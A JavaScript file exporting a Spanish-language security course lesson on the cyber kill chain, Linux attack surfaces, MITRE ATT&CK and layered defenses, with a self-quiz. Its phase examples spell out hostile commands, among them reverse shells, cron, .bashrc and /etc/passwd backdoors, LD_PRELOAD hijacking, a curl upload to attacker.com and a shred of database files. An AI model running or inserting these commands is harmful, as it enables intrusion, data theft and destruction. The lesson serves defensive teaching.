const content = `
## Módulo 1 — Threat modeling: kill chain y superficies de ataque en Linux

### 🎯 Objetivos de aprendizaje

* Comprender el modelo Lockheed Martin Cyber Kill Chain y sus 7 fases.
* Mapear superficies de ataque específicas de Linux a cada fase del kill chain.
* Familiarizarse con el framework MITRE ATT&CK y su relevancia operacional.
* Identificar TTPs (tácticas, técnicas y procedimientos) de actores de amenaza comunes.
* Diseñar defensas por capas alineadas con las fases del kill chain.

### ❓ El problema real

Un servidor de producción fue comprometido. El equipo de operaciones descubre que el atacante llevaba tres semanas dentro del sistema antes de ser detectado. ¿Cómo es posible? El atacante no usó un exploit espectacular: entró por SSH con credenciales débiles, escaló privilegios con un binario SUID mal configurado y mantuvo persistencia mediante un cron job oculto. Sin un modelo mental de cómo funciona un ataque completo, los defensores reaccionan a síntomas individuales y pierden el cuadro completo.

### 📖 Lockheed Martin Cyber Kill Chain

El Cyber Kill Chain es un modelo de 7 fases que describe la progresión de un ataque dirigido. Entender cada fase permite diseñar controles en múltiples puntos del ataque.

\`\`\`text
FASE              DESCRIPCIÓN                          OBJETIVO DEL ATACANTE
─────────────────────────────────────────────────────────────────────────────
1. Reconocimiento  Recolección de información           Conocer el objetivo
2. Armado          Preparar el payload/exploit          Crear la herramienta de ataque
3. Entrega         Enviar el payload al objetivo        Llegar al sistema objetivo
4. Explotación     Ejecutar el exploit                  Ganar ejecución de código
5. Instalación     Instalar backdoor/malware            Persistencia en el sistema
6. C2              Establecer canal de mando y control  Controlar el sistema comprometido
7. Acciones        Cumplir el objetivo final            Exfiltración, destrucción, movimiento lateral
\`\`\`

### 📖 Superficies de ataque en Linux por fase del kill chain

**Fase 1 — Reconocimiento**

El atacante recolecta información antes de atacar. En Linux, esto incluye:

\`\`\`bash
# Lo que el atacante ve desde fuera:
# - Servicios expuestos (nmap -sV -sC target)
# - Versiones de software (banner grabbing)
# - Usuarios válidos (SMTP VRFY, SSH timing attacks)
# - Estructura de URLs (dirb, gobuster contra web)
# - Metadatos en documentos publicados

# Contramedida: reducir la superficie visible
# - Deshabilitar banners informativos
# - Cerrar puertos innecesarios
# - Configurar fail2ban para bloquear scanners
\`\`\`

**Fase 2 — Armado**

El atacante prepara el exploit o payload. No requiere acceso al sistema objetivo. Las defensas en esta fase son de inteligencia de amenazas.

**Fase 3 — Entrega**

Los vectores de entrega más comunes en Linux:

\`\`\`text
VECTOR                    EJEMPLOS REALES
────────────────────────────────────────────────────────────────
SSH brute force           hydra -l root -P wordlist.txt ssh://target
Servicios web             SQLi, RFI, carga de webshells PHP
Email (phishing)          Adjuntos maliciosos a usuarios con acceso
Servicios expuestos       Redis sin auth, Memcached, Elasticsearch público
Supply chain              Dependencias npm/pip comprometidas
\`\`\`

**Fase 4 — Explotación**

Técnicas de explotación comunes en Linux:

\`\`\`bash
# SUID binarios mal configurados (privilege escalation)
find / -perm -4000 -type f 2>/dev/null
# Ejemplos peligrosos: nmap (versiones antiguas), vim, python, find

# sudo mal configurado
sudo -l  # el atacante busca comandos ejecutables como root

# Variables de entorno manipuladas
# LD_PRELOAD: cargar librería maliciosa antes que las legítimas
export LD_PRELOAD=/tmp/evil.so
# PATH hijacking: reemplazar binarios del sistema con versiones maliciosas
export PATH=/tmp:\$PATH

# Vulnerabilidades de kernel (privilege escalation local)
# DirtyCow (CVE-2016-5195), OverlayFS, etc.
uname -r  # versión del kernel para buscar exploits
\`\`\`

**Fase 5 — Instalación (Persistencia)**

Técnicas de persistencia en Linux:

\`\`\`bash
# Cron jobs maliciosos
echo "* * * * * root /tmp/.hidden/backdoor" >> /etc/cron.d/system-update
crontab -e  # para el usuario comprometido

# Modificación de archivos de inicio
echo "bash -i >& /dev/tcp/attacker/4444 0>&1" >> ~/.bashrc
echo "/tmp/.hidden/backdoor &" >> /etc/rc.local

# Backdoor en /etc/passwd (usuario con UID 0)
echo "service:x:0:0::/root:/bin/bash" >> /etc/passwd

# SSH authorized_keys
echo "ssh-rsa ATTACKER_KEY" >> ~/.ssh/authorized_keys

# Módulo de kernel malicioso (rootkit)
insmod /tmp/rootkit.ko

# Librería compartida comprometida
# Reemplazar libpam.so para capturar contraseñas
\`\`\`

**Fase 6 — Comando y Control (C2)**

\`\`\`bash
# Reverse shell básica
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Túnel DNS (exfiltración encubierta)
# El tráfico DNS sale de casi cualquier red

# Comunicación por HTTP/HTTPS (difícil de detectar)
# Herramientas: Cobalt Strike, Metasploit Meterpreter, Empire

# Detección: conexiones salientes inusuales
ss -tnp | grep ESTABLISHED
netstat -an | grep :4444
\`\`\`

**Fase 7 — Acciones sobre el objetivo**

\`\`\`bash
# Exfiltración de datos
tar -czf /tmp/data.tar.gz /var/www/html/config/
curl -F "file=@/tmp/data.tar.gz" http://attacker.com/upload

# Movimiento lateral
# Usar claves SSH encontradas en el sistema comprometido
cat ~/.ssh/known_hosts  # hosts conocidos → próximos objetivos
cat ~/.ssh/id_rsa       # clave privada para moverse a otros servidores

# Ransomware / destrucción
find / -name "*.db" -exec shred -u {} \;
\`\`\`

### 📖 MITRE ATT&CK Framework

MITRE ATT&CK es una base de conocimiento de tácticas y técnicas de adversarios basada en observaciones del mundo real. Es más granular que el kill chain.

\`\`\`text
TÁCTICA ATT&CK              TÉCNICAS RELEVANTES EN LINUX
─────────────────────────────────────────────────────────────────────────────
Initial Access              T1078 (creds válidas), T1190 (exploit servicio público)
Execution                   T1059.004 (bash/sh), T1053.003 (cron)
Persistence                 T1136 (crear cuenta), T1546 (event triggered execution)
Privilege Escalation        T1548.001 (SUID), T1068 (exploit kernel)
Defense Evasion             T1070 (borrar logs), T1027 (ofuscación)
Credential Access           T1003 (dump credenciales), T1110 (brute force)
Discovery                   T1057 (process discovery), T1018 (remote system discovery)
Lateral Movement            T1021.004 (SSH), T1570 (lateral tool transfer)
Collection                  T1005 (datos locales), T1039 (datos en red compartida)
Exfiltration                T1041 (exfil por C2), T1048 (exfil por protocolo alternativo)
\`\`\`

URL de referencia: https://attack.mitre.org/matrices/enterprise/linux/

### 📖 Defense-in-depth mapeado al kill chain

\`\`\`text
FASE          CONTROL DEFENSIVO
─────────────────────────────────────────────────────────────────────────────
Reconocimiento  fail2ban (bloquear scanners), cerrar puertos, ocultar banners
Armado          Inteligencia de amenazas (feeds de IoC)
Entrega         WAF, filtrado de email, actualización de software
Explotación     SELinux/AppArmor, deshabilitar SUID innecesarios, sudo restringido
Instalación     AIDE (detección de cambios), monitoreo de cron, auditd
C2              Firewall egress, IDS de red, monitoreo de DNS
Acciones        DLP, segmentación de red, backups cifrados fuera de línea
\`\`\`

### 📋 Lo que debes recordar

* El kill chain describe 7 fases secuenciales; romper cualquier fase detiene el ataque.
* Las superficies de ataque más explotadas en Linux son SSH, servicios web, SUID/sudo y cron.
* MITRE ATT&CK es más granular: mapea técnicas específicas observadas en ataques reales.
* Defense-in-depth significa controles en cada fase, no solo en el perímetro.
* LD_PRELOAD, PATH hijacking y modificaciones de /etc/passwd son señales de alerta críticas.

### 🧪 Autoevaluación

1. ¿En qué fase del kill chain se instala un backdoor como cron job malicioso?
2. Un atacante ejecuta \`find / -perm -4000 -type f\`. ¿Qué está buscando y en qué fase está?
3. ¿Qué control defensivo detiene específicamente la fase de "Entrega" en un ataque SSH brute force?

---

1. Fase 5 — Instalación. El cron job proporciona persistencia al atacante después de ganar acceso inicial.
2. Está buscando binarios con el bit SUID activado para escalar privilegios. Esto ocurre en la fase 4 (Explotación) o al inicio de la fase 5, buscando rutas para persistencia con privilegios elevados.
3. fail2ban. Detecta múltiples intentos fallidos de autenticación SSH y bloquea automáticamente la IP del atacante mediante iptables/nftables, cortando el vector de entrega antes de que llegue a la fase de explotación.
`

export default content
